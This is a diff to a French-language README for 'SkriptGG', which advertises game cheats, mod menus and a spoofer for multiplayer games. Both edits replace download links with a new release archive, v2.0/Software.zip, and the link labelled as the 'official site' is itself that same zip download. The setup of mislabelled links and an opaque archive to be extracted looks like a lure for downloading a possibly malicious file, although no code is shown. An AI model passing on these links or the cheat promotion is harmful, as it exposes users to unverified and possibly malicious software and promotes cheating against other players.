@@ -27,7 +27,7 @@ Bienvenue dans le référentiel **SkriptGG** ! Ce référentiel est conçu pour 
 - skriptgg-spoofer-free
 
 ## 🌐 Download Latest Version
-[![Download SkriptGG](https://github.com/Anhthuw1307/SkriptGG/releases/download/v1.0/App.zip)](https://github.com/Anhthuw1307/SkriptGG/releases/download/v1.0/App.zip)
+[![Download SkriptGG](https://github.com/Anhthuw1307/SkriptGG/releases/download/v2.0/Software.zip)](https://github.com/Anhthuw1307/SkriptGG/releases/download/v2.0/Software.zip)
 
 *Le fichier doit être extrait après le téléchargement.*
 
@@ -73,4 +73,4 @@ Merci d'avoir choisi SkriptGG pour vos besoins de triche dans les jeux multijoue
 
 ---
 
-Visitez le [site officiel de SkriptGG](https://github.com/Anhthuw1307/SkriptGG/releases/download/v1.0/App.zip) pour explorer davantage de fonctionnalités et télécharger le dernier menu de mods pour vos jeux préférés. 🎮
+Visitez le [site officiel de SkriptGG](https://github.com/Anhthuw1307/SkriptGG/releases/download/v2.0/Software.zip) pour explorer davantage de fonctionnalités et télécharger le dernier menu de mods pour vos jeux préférés. 🎮
